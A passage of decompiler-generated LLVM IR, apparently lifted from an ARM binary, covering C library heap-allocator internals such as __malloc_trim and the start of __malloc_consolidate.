  %tmp41 = icmp ugt i32 %v2_12998, 15
  %v1_129c8 = urem i32 %v3_129a0, 2
  store i32 %v1_129c8, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_129c8, label %dec_label_pc_129a8

dec_label_pc_129a8:                               ; preds = %dec_label_pc_12998
  %v2_129ac = or i32 %v1_129c8, %v0_129ac
  store i32 %v2_129ac, i32* %r3.global-to-local, align 4
  store i32 %v2_129ac, i32* %v2_129a0, align 4
  %v0_129b4 = load i32, i32* @sl, align 4
  %v1_129b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_129b4 = add i32 %v1_129b4, %v0_129b4
  store i32 %v2_129b4, i32* %r2.global-to-local, align 4
  %v1_129b8 = add i32 %v2_129b4, 4
  %v2_129b8 = inttoptr i32 %v1_129b8 to i32*
  %v3_129b8 = load i32, i32* %v2_129b8, align 4
  %v1_129bc = or i32 %v3_129b8, 1
  store i32 %v1_129bc, i32* %r3.global-to-local, align 4
  store i32 %v1_129bc, i32* %v2_129b8, align 4
  br label %dec_label_pc_129f8

dec_label_pc_129c8:                               ; preds = %dec_label_pc_12998
  %v2_129cc = add i32 %v0_129a0, %v0_12998
  store i32 %v2_129cc, i32* %r0.global-to-local, align 4
  %v2_129d0 = or i32 %v1_129c8, %v0_12998
  store i32 %v2_129d0, i32* %r3.global-to-local, align 4
  %v1_129d4 = or i32 %v2_12998, 1
  store i32 %v1_129d4, i32* %r2.global-to-local, align 4
  store i32 %v2_129d0, i32* %v2_129a0, align 4
  %v0_129dc = load i32, i32* %r2.global-to-local, align 4
  %v1_129dc = load i32, i32* %r0.global-to-local, align 4
  %v2_129dc = add i32 %v1_129dc, 4
  %v3_129dc = inttoptr i32 %v2_129dc to i32*
  store i32 %v0_129dc, i32* %v3_129dc, align 4
  %v0_129e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_129e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_129e0 = add i32 %v1_129e0, %v0_129e0
  store i32 %v2_129e0, i32* %r2.global-to-local, align 4
  %v1_129e4 = add i32 %v2_129e0, 4
  %v2_129e4 = inttoptr i32 %v1_129e4 to i32*
  %v3_129e4 = load i32, i32* %v2_129e4, align 4
  %v1_129e8 = or i32 %v3_129e4, 1
  store i32 %v1_129e8, i32* %r3.global-to-local, align 4
  store i32 %v1_129e8, i32* %v2_129e4, align 4
  %v0_129f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_129f0 = add i32 %v0_129f0, 8
  store i32 %v1_129f0, i32* @r0, align 4
  %v0_129f4 = call i32 @free()
  store i32 %v0_129f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_129f8

dec_label_pc_129f8:                               ; preds = %dec_label_pc_129a8, %dec_label_pc_129c8
  %v0_129f8 = load i32, i32* @sl, align 4
  %v1_129f8 = add i32 %v0_129f8, 8
  store i32 %v1_129f8, i32* @r4, align 4
  br label %dec_label_pc_12acc

dec_label_pc_12a00:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r1.global-to-local, align 4
  %v4_12a08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 64) to i32*), align 4
  store i32 %v4_12a08, i32* @r8, align 4
  %v2_12a0c = inttoptr i32 %v1_1281c to i32*
  %v3_12a0c = load i32, i32* %v2_12a0c, align 4
  store i32 %v3_12a0c, i32* @r4, align 4
  %v1_12a10 = add i32 %v4_12a08, 860
  %v2_12a10 = inttoptr i32 %v1_12a10 to i32*
  %v3_12a10 = load i32, i32* %v2_12a10, align 4
  %v1_12a14 = add i32 %v3_12a0c, 4
  %v1_12a18 = add i32 %v3_12a10, -1
  store i32 %v1_12a18, i32* %r2.global-to-local, align 4
  %v2_12a1c = add i32 %v1_12a14, %v1_12a18
  %v1_12a20 = load i32, i32* @sb, align 4
  %v2_12a20 = add i32 %v2_12a1c, %v1_12a20
  store i32 %v2_12a20, i32* %r3.global-to-local, align 4
  %v2_12a24 = sub i32 0, %v3_12a10
  %v3_12a24 = and i32 %v2_12a20, %v2_12a24
  store i32 %v3_12a24, i32* @r7, align 4
  %v2_12a28 = sub i32 %v3_12a24, %v3_12a0c
  store i32 %v2_12a28, i32* @fp, align 4
  %v9_12a2c = icmp eq i32 %v1_12820, %v2_12a28
  br i1 %v9_12a2c, label %dec_label_pc_12aa0, label %dec_label_pc_12a34

dec_label_pc_12a34:                               ; preds = %dec_label_pc_12a00
  %v2_12a34 = sub i32 %v1_1281c, %v3_12a0c
  store i32 %v2_12a34, i32* %r0.global-to-local, align 4
  %v2_12a38 = add i32 %v3_12a0c, %v1_12820
  store i32 %v2_12a38, i32* %r1.global-to-local, align 4
  store i32 %v3_12a24, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_12a44 = call i32 @mremap(i32 %v2_12a34, i32 %v2_12a38, i32 %v3_12a24, i32 1)
  store i32 %v4_12a44, i32* %r0.global-to-local, align 4
  %v7_12a48 = icmp eq i32 %v4_12a44, -1
  br i1 %v7_12a48, label %dec_label_pc_12a94, label %dec_label_pc_12a50

dec_label_pc_12a50:                               ; preds = %dec_label_pc_12a34
  %v1_12a50 = load i32, i32* @r4, align 4
  %v2_12a50 = add i32 %v1_12a50, %v4_12a44
  store i32 %v2_12a50, i32* %r0.global-to-local, align 4
  %v0_12a54 = load i32, i32* @fp, align 4
  %v1_12a54 = or i32 %v0_12a54, 2
  store i32 %v1_12a54, i32* %r3.global-to-local, align 4
  %v2_12a58 = add i32 %v2_12a50, 4
  %v3_12a58 = inttoptr i32 %v2_12a58 to i32*
  store i32 %v1_12a54, i32* %v3_12a58, align 4
  %v0_12a5c = load i32, i32* @r8, align 4
  %v1_12a5c = add i32 %v0_12a5c, 868
  %v2_12a5c = inttoptr i32 %v1_12a5c to i32*
  %v3_12a5c = load i32, i32* %v2_12a5c, align 4
  store i32 %v3_12a5c, i32* %r3.global-to-local, align 4
  %v1_12a60 = add i32 %v0_12a5c, 880
  %v2_12a60 = inttoptr i32 %v1_12a60 to i32*
  %v3_12a60 = load i32, i32* %v2_12a60, align 4
  store i32 %v3_12a60, i32* %r2.global-to-local, align 4
  %v0_12a64 = load i32, i32* @r6, align 4
  %v2_12a64 = sub i32 %v3_12a5c, %v0_12a64
  store i32 %v2_12a64, i32* %r3.global-to-local, align 4
  %v1_12a68 = load i32, i32* @r7, align 4
  %v2_12a68 = add i32 %v1_12a68, %v2_12a64
  store i32 %v2_12a68, i32* %r1.global-to-local, align 4
  %v1_12a6c = add i32 %v0_12a5c, 872
  %v2_12a6c = inttoptr i32 %v1_12a6c to i32*
  %v3_12a6c = load i32, i32* %v2_12a6c, align 4
  store i32 %v3_12a6c, i32* %r3.global-to-local, align 4
  %v1_12a74 = add i32 %v0_12a5c, 884
  %v2_12a74 = inttoptr i32 %v1_12a74 to i32*
  %v3_12a74 = load i32, i32* %v2_12a74, align 4
  store i32 %v3_12a74, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_12a68, %v3_12a60
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_12a50
  store i32 %v2_12a68, i32* %v2_12a60, align 4
  %v0_12a7c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12a7c.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_12a50, %bb33
  %v1_12a7c = phi i32 [ %v0_12a5c, %dec_label_pc_12a50 ], [ %v1_12a7c.pre, %bb33 ]
  %v0_12a7c = phi i32 [ %v2_12a68, %dec_label_pc_12a50 ], [ %v0_12a7c.pre, %bb33 ]
  %v2_12a7c = add i32 %v1_12a7c, 868
  %v3_12a7c = inttoptr i32 %v2_12a7c to i32*
  store i32 %v0_12a7c, i32* %v3_12a7c, align 4
  %v0_12a80 = load i32, i32* %r1.global-to-local, align 4
  %v1_12a80 = load i32, i32* %r3.global-to-local, align 4
  %v2_12a80 = add i32 %v1_12a80, %v0_12a80
  store i32 %v2_12a80, i32* %r1.global-to-local, align 4
  %v1_12a84 = load i32, i32* %r2.global-to-local, align 4
  %v0_12a88 = load i32, i32* %r0.global-to-local, align 4
  %v1_12a88 = add i32 %v0_12a88, 8
  store i32 %v1_12a88, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_12a80, %v1_12a84
  br i1 %tmp43, label %bb35, label %dec_label_pc_12acc

bb35:                                             ; preds = %bb34
  %v5_12a8c = load i32, i32* @r8, align 4
  %v6_12a8c = add i32 %v5_12a8c, 884
  %v7_12a8c = inttoptr i32 %v6_12a8c to i32*
  store i32 %v2_12a80, i32* %v7_12a8c, align 4
  br label %dec_label_pc_12acc

dec_label_pc_12a94:                               ; preds = %dec_label_pc_12a34
  %v0_12a94 = load i32, i32* @sb, align 4
  %v1_12a94 = add i32 %v0_12a94, 4
  store i32 %v1_12a94, i32* %r3.global-to-local, align 4
  %v0_12a98 = load i32, i32* @r6, align 4
  %v3_12a98 = icmp ult i32 %v0_12a98, %v1_12a94
  br i1 %v3_12a98, label %dec_label_pc_12aa8, label %dec_label_pc_12a94.dec_label_pc_12aa0_crit_edge

dec_label_pc_12a94.dec_label_pc_12aa0_crit_edge:  ; preds = %dec_label_pc_12a94
  %v0_12aa0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12aa0

dec_label_pc_12aa0:                               ; preds = %dec_label_pc_12a94.dec_label_pc_12aa0_crit_edge, %dec_label_pc_12a00
  %v0_12aa0 = phi i32 [ %v0_12aa0.pre, %dec_label_pc_12a94.dec_label_pc_12aa0_crit_edge ], [ %v0_12808, %dec_label_pc_12a00 ]
  store i32 %v0_12aa0, i32* @r4, align 4
  br label %dec_label_pc_12acc

dec_label_pc_12aa8:                               ; preds = %dec_label_pc_12a94
  %v1_12aa8 = add i32 %v0_12a94, -7
  store i32 %v1_12aa8, i32* @r0, align 4
  %v0_12aac = call i32 @malloc()
  store i32 %v0_12aac, i32* @r0, align 4
  store i32 %v0_12aac, i32* @r4, align 4
  %v2_12ab0 = icmp eq i32 %v0_12aac, 0
  br i1 %v2_12ab0, label %dec_label_pc_12acc, label %dec_label_pc_12ab8

dec_label_pc_12ab8:                               ; preds = %dec_label_pc_12aa8
  %v0_12ab8 = load i32, i32* @r6, align 4
  %v1_12ab8 = add i32 %v0_12ab8, -8
  store i32 %v1_12ab8, i32* @r2, align 4
  %v0_12abc = load i32, i32* @r5, align 4
  store i32 %v0_12abc, i32* @r1, align 4
  %v0_12ac0 = call i32 @memcpy()
  %v0_12ac4 = load i32, i32* @r5, align 4
  store i32 %v0_12ac4, i32* @r0, align 4
  %v0_12ac8 = call i32 @free()
  store i32 %v0_12ac8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12acc

dec_label_pc_12acc:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_12aa8, %dec_label_pc_12aa0, %dec_label_pc_129f8, %.thread6, %dec_label_pc_12868, %dec_label_pc_12ab8
  store i32 %v2_127b4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r2.global-to-local, align 4
  %v4_12adc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12adc)
  br label %dec_label_pc_12ae8

dec_label_pc_12ae8:                               ; preds = %dec_label_pc_127e8, %dec_label_pc_12790, %dec_label_pc_12778, %dec_label_pc_12acc
  %v0_12ae8 = load i32, i32* @r4, align 4
  store i32 %v0_12ae8, i32* %r0.global-to-local, align 4
  store i32 %v3_12758, i32* @r4, align 4
  store i32 %v6_12758, i32* @r5, align 4
  store i32 %v9_12758, i32* @r6, align 4
  store i32 %v12_12758, i32* @r7, align 4
  store i32 %v15_12758, i32* @r8, align 4
  store i32 %v18_12758, i32* @sb, align 4
  store i32 %v21_12758, i32* @sl, align 4
  store i32 %v24_12758, i32* @fp, align 4
  store i32 %v27_12758, i32* @lr, align 4
  ret i32 %v0_12ae8

; uselistorder directives
  uselistorder i32 %v2_12a80, { 1, 0, 2 }
  uselistorder i32 %v2_12a68, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12a44, { 1, 0, 2 }
  uselistorder i32 %v3_12a24, { 1, 0, 2, 3 }
  uselistorder i32 %v1_129c8, { 2, 1, 0 }
  uselistorder i32 %v2_12998, { 1, 0, 2 }
  uselistorder i32 %v0_1292c, { 1, 0 }
  uselistorder i32 %v0_128e8, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_1284c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_12844, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_12828, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_12820, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1281c, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1280c, { 1, 0 }
  uselistorder i32 %v0_12808, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_127e0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12ae8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12acc, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_129f8, { 1, 0 }
  uselistorder label %dec_label_pc_12998, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_128e4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_128d8, { 1, 0 }
  uselistorder label %dec_label_pc_128d4, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_12afc(i32 %arg1) local_unnamed_addr {
dec_label_pc_12afc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_12afc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12afc, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_12afc
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_12b10.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12b10.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_12b14.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_12afc, %bb
  %v4_12b14 = phi i32 [ %v4_12b14.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_12afc ], [ 0, %bb ]
  ret i32 %v4_12b14

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_12b18 = add i32 %arg2, 44
  %v2_12b18 = inttoptr i32 %v1_12b18 to i32*
  %v3_12b18 = load i32, i32* %v2_12b18, align 4
  %v3_12b1c = load i32, i32* @r4, align 4
  store i32 %v3_12b1c, i32* %stack_var_-20, align 4
  %v12_12b1c = load i32, i32* @r7, align 4
  %v1_12b20 = add i32 %v3_12b18, 4
  %v2_12b20 = inttoptr i32 %v1_12b20 to i32*
  %v3_12b20 = load i32, i32* %v2_12b20, align 4
  %v1_12b24 = add i32 %arg2, 860
  %v2_12b24 = inttoptr i32 %v1_12b24 to i32*
  %v3_12b24 = load i32, i32* %v2_12b24, align 4
  store i32 %v3_12b24, i32* @r4, align 4
  %v1_12b28 = and i32 %v3_12b20, -4
  store i32 %v1_12b28, i32* @r6, align 4
  %v1_12b2c = add i32 %v1_12b28, -17
  %v2_12b30 = add i32 %v1_12b2c, %v3_12b24
  store i32 %arg2, i32* @r5, align 4
  %v2_12b3c = sub i32 %v2_12b30, %arg1
  store i32 %v3_12b24, i32* %r1.global-to-local, align 4
  %v2_12b44 = udiv i32 %v2_12b3c, %v3_12b24
  %v1_12b48 = add i32 %v2_12b44, -1
  store i32 %v1_12b48, i32* %r0.global-to-local, align 4
  %v2_12b4c = mul i32 %v1_12b48, %v3_12b24
  store i32 %v2_12b4c, i32* @r7, align 4
  %v2_12b50 = icmp eq i32 %v2_12b4c, 0
  store i1 %v2_12b50, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_12b4c, 1
  br i1 %tmp8, label %dec_label_pc_12bb8, label %dec_label_pc_12b58

dec_label_pc_12b58:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12b5c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12b5c, i32* %r0.global-to-local, align 4
  %v0_12b60 = load i32, i32* @r5, align 4
  %v1_12b60 = add i32 %v0_12b60, 44
  %v2_12b60 = inttoptr i32 %v1_12b60 to i32*
  %v3_12b60 = load i32, i32* %v2_12b60, align 4
  %v0_12b64 = load i32, i32* @r6, align 4
  %v2_12b64 = add i32 %v0_12b64, %v3_12b60
  %v9_12b68 = icmp eq i32 %v1_12b5c, %v2_12b64
  store i1 %v9_12b68, i1* @cpsr_z, align 1
  store i32 %v1_12b5c, i32* @r4, align 4
  br i1 %v9_12b68, label %dec_label_pc_12b74, label %dec_label_pc_12bb8

dec_label_pc_12b74:                               ; preds = %dec_label_pc_12b58
  %v0_12b74 = load i32, i32* @r7, align 4
  %v1_12b74 = sub i32 0, %v0_12b74
  store i32 %v1_12b74, i32* %r0.global-to-local, align 4
  %v1_12b78 = call i32 @__GI_sbrk(i32 %v1_12b74)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12b80 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12b80, i32* %r0.global-to-local, align 4
  %v7_12b84 = icmp eq i32 %v1_12b80, -1
  store i1 %v7_12b84, i1* @cpsr_z, align 1
  br i1 %v7_12b84, label %dec_label_pc_12bb8, label %dec_label_pc_12b8c

dec_label_pc_12b8c:                               ; preds = %dec_label_pc_12b74
  %v0_12b8c = load i32, i32* @r4, align 4
  %v2_12b8c = sub i32 %v0_12b8c, %v1_12b80
  store i32 %v2_12b8c, i32* %r0.global-to-local, align 4
  %v9_12b8c = icmp eq i32 %v0_12b8c, %v1_12b80
  store i1 %v9_12b8c, i1* @cpsr_z, align 1
  br i1 %v9_12b8c, label %dec_label_pc_12bb8, label %dec_label_pc_12b94

dec_label_pc_12b94:                               ; preds = %dec_label_pc_12b8c
  %v0_12b94 = load i32, i32* @r5, align 4
  %v1_12b94 = add i32 %v0_12b94, 872
  %v2_12b94 = inttoptr i32 %v1_12b94 to i32*
  %v3_12b94 = load i32, i32* %v2_12b94, align 4
  %v1_12b98 = load i32, i32* @r6, align 4
  %v2_12b98 = sub i32 %v1_12b98, %v2_12b8c
  store i32 %v2_12b98, i32* %r2.global-to-local, align 4
  %v1_12b9c = add i32 %v0_12b94, 44
  %v2_12b9c = inttoptr i32 %v1_12b9c to i32*
  %v3_12b9c = load i32, i32* %v2_12b9c, align 4
  store i32 %v3_12b9c, i32* %r1.global-to-local, align 4
  %v2_12ba0 = sub i32 %v3_12b94, %v2_12b8c
  %v1_12ba4 = or i32 %v2_12b98, 1
  store i32 %v1_12ba4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_12ba0, i32* %v2_12b94, align 4
  %v0_12bb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12bb0 = load i32, i32* %r1.global-to-local, align 4
  %v2_12bb0 = add i32 %v1_12bb0, 4
  %v3_12bb0 = inttoptr i32 %v2_12bb0 to i32*
  store i32 %v0_12bb0, i32* %v3_12bb0, align 4
  %v1_12bc4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12bbc

dec_label_pc_12bb8:                               ; preds = %dec_label_pc_12b58, %dec_label_pc_12b8c, %dec_label_pc_12b74, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12bbc

dec_label_pc_12bbc:                               ; preds = %dec_label_pc_12b94, %dec_label_pc_12bb8
  %v1_12bc4 = phi i32 [ %v1_12bc4.pre, %dec_label_pc_12b94 ], [ 0, %dec_label_pc_12bb8 ]
  %v2_12bc0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12bc0, i32* @r4, align 4
  store i32 %v12_12b1c, i32* @r7, align 4
  ret i32 %v1_12bc4

; uselistorder directives
  uselistorder i1 %v7_12b84, { 1, 0 }
  uselistorder i32 %v1_12b80, { 2, 1, 0, 3 }
  uselistorder i32 %v3_12b24, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12bbc, { 1, 0 }
  uselistorder label %dec_label_pc_12bb8, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_12bc8 = load i32, i32* @r4, align 4
  store i32 %v3_12bc8, i32* %stack_var_-36, align 4
  %v0_12bcc = load i32, i32* @r0, align 4
  %v1_12bcc = inttoptr i32 %v0_12bcc to i32*
  %v2_12bcc = load i32, i32* %v1_12bcc, align 4
  store i32 %v2_12bcc, i32* %r3.global-to-local, align 4
  %v2_12bd0 = icmp eq i32 %v2_12bcc, 0
  store i32 %v0_12bcc, i32* @r4, align 4
  br i1 %v2_12bd0, label %dec_label_pc_12d08.preheader, label %dec_label_pc_12be4

dec_label_pc_12d08.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_12d1025 = add i32 %v0_12bcc, 52
  store i32 %v1_12d1025, i32* %r3.global-to-local, align 4
  %v2_12d1826 = add i32 %v0_12bcc, 60
  %v3_12d1827 = inttoptr i32 %v2_12d1826 to i32*
  store i32 %v1_12d1025, i32* %v3_12d1827, align 4
  %v0_12d1c28 = load i32, i32* %r3.global-to-local, align 4
  %v2_12d1c29 = add i32 %v0_12d1c28, 12
  %v3_12d1c30 = inttoptr i32 %v2_12d1c29 to i32*
  store i32 %v0_12d1c28, i32* %v3_12d1c30, align 4
  br label %dec_label_pc_12d08.dec_label_pc_12d08_crit_edge

dec_label_pc_12be4:                               ; preds = %entry
  %v1_12be4 = and i32 %v2_12bcc, -3
  %v3_12be8 = udiv i32 %v2_12bcc, 8
  store i32 %v3_12be8, i32* %r2.global-to-local, align 4
  store i32 %v1_12be4, i32* %v1_12bcc, align 4
  %v0_12bf0 = load i32, i32* @r0, align 4
  %v1_12bf0 = add i32 %v0_12bf0, -4
  store i32 %v1_12bf0, i32* %r3.global-to-local, align 4
  %v1_12bf4 = load i32, i32* %r2.global-to-local, align 4
  %v4_12bf4 = mul i32 %v1_12bf4, 4
  %v5_12bf4 = add i32 %v4_12bf4, %v1_12bf0
  store i32 %v5_12bf4, i32* %sb.global-to-local, align 4
  %v1_12bf8 = add i32 %v0_12bf0, 52
  store i32 %v1_12bf8, i32* %r7.global-to-local, align 4
  %v1_12bfc = add i32 %v0_12bf0, 4
  store i32 %v1_12bfc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_12c04

dec_label_pc_12c04:                               ; preds = %dec_label_pc_12d00, %dec_label_pc_12be4
  %v1_12cf810 = phi i32 [ %v1_12cf8, %dec_label_pc_12d00 ], [ %v5_12bf4, %dec_label_pc_12be4 ]
  %v1_12c10 = phi i32 [ %v1_12d00, %dec_label_pc_12d00 ], [ %v1_12bfc, %dec_label_pc_12be4 ]
  %v1_12c04 = inttoptr i32 %v1_12c10 to i32*
  %v2_12c04 = load i32, i32* %v1_12c04, align 4
  store i32 %v2_12c04, i32* %r1.global-to-local, align 4
  %v2_12c08 = icmp eq i32 %v2_12c04, 0
  br i1 %v2_12c08, label %dec_label_pc_12cf8, label %dec_label_pc_12c10

dec_label_pc_12c10:                               ; preds = %dec_label_pc_12c04
  %v0_12c10 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_12c10, i32* %v1_12c04, align 4
  %v0_12c14.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12c14

dec_label_pc_12c14:                               ; preds = %dec_label_pc_12cec, %dec_label_pc_12c10
  %v0_12c30 = phi i32 [ %v0_12cec, %dec_label_pc_12cec ], [ %v0_12c14.pre, %dec_label_pc_12c10 ]
  %v1_12c14 = add i32 %v0_12c30, 4
  %v2_12c14 = inttoptr i32 %v1_12c14 to i32*
  %v3_12c14 = load i32, i32* %v2_12c14, align 4
  store i32 %v3_12c14, i32* %r3.global-to-local, align 4
  %v1_12c18 = and i32 %v3_12c14, -2
  store i32 %v1_12c18, i32* %lr.global-to-local, align 4
  %v2_12c1c = add i32 %v1_12c18, %v0_12c30
  store i32 %v2_12c1c, i32* @r0, align 4
  %v1_12c20 = urem i32 %v3_12c14, 2
  %v2_12c20 = icmp eq i32 %v1_12c20, 0
  %v1_12c24 = add i32 %v0_12c30, 8
  %v2_12c24 = inttoptr i32 %v1_12c24 to i32*
  %v3_12c24 = load i32, i32* %v2_12c24, align 4
  store i32 %v3_12c24, i32* %sl.global-to-local, align 4
  %v1_12c28 = add i32 %v2_12c1c, 4
  %v2_12c28 = inttoptr i32 %v1_12c28 to i32*
  %v3_12c28 = load i32, i32* %v2_12c28, align 4
  store i32 %v3_12c28, i32* %r8.global-to-local, align 4
  br i1 %v2_12c20, label %dec_label_pc_12c30, label %dec_label_pc_12c64

dec_label_pc_12c30:                               ; preds = %dec_label_pc_12c14
  %v1_12c30 = inttoptr i32 %v0_12c30 to i32*
  %v2_12c30 = load i32, i32* %v1_12c30, align 4
  store i32 %v2_12c30, i32* %r5.global-to-local, align 4
  %v2_12c34 = sub i32 %v0_12c30, %v2_12c30
  store i32 %v2_12c34, i32* %r3.global-to-local, align 4
  %v1_12c38 = add i32 %v2_12c34, 8
  %v2_12c38 = inttoptr i32 %v1_12c38 to i32*
  %v3_12c38 = load i32, i32* %v2_12c38, align 4
  store i32 %v3_12c38, i32* %ip.global-to-local, align 4
  %v1_12c3c = add i32 %v3_12c38, 12
  %v2_12c3c = inttoptr i32 %v1_12c3c to i32*
  %v3_12c3c = load i32, i32* %v2_12c3c, align 4
  store i32 %v3_12c3c, i32* %r1.global-to-local, align 4
  %v9_12c40 = icmp eq i32 %v3_12c3c, %v2_12c34
  %v1_12c44 = add i32 %v2_12c34, 12
  %v2_12c44 = inttoptr i32 %v1_12c44 to i32*
  %v3_12c44 = load i32, i32* %v2_12c44, align 4
  store i32 %v3_12c44, i32* %r2.global-to-local, align 4
  br i1 %v9_12c40, label %dec_label_pc_12c4c, label %dec_label_pc_12ca8

dec_label_pc_12c4c:                               ; preds = %dec_label_pc_12c30
  %v1_12c4c = add i32 %v3_12c44, 8
  %v2_12c4c = inttoptr i32 %v1_12c4c to i32*
  %v3_12c4c = load i32, i32* %v2_12c4c, align 4
  store i32 %v3_12c4c, i32* %r3.global-to-local, align 4
  %v9_12c50 = icmp eq i32 %v3_12c4c, %v2_12c34
  br i1 %v9_12c50, label %dec_label_pc_12c58, label %dec_label_pc_12ca8

dec_label_pc_12c58:                               ; preds = %dec_label_pc_12c4c
  store i32 %v3_12c38, i32* %v2_12c4c, align 4
  %v0_12c5c = load i32, i32* %r2.global-to-local, align 4
  %v1_12c5c = load i32, i32* %ip.global-to-local, align 4
  %v2_12c5c = add i32 %v1_12c5c, 12
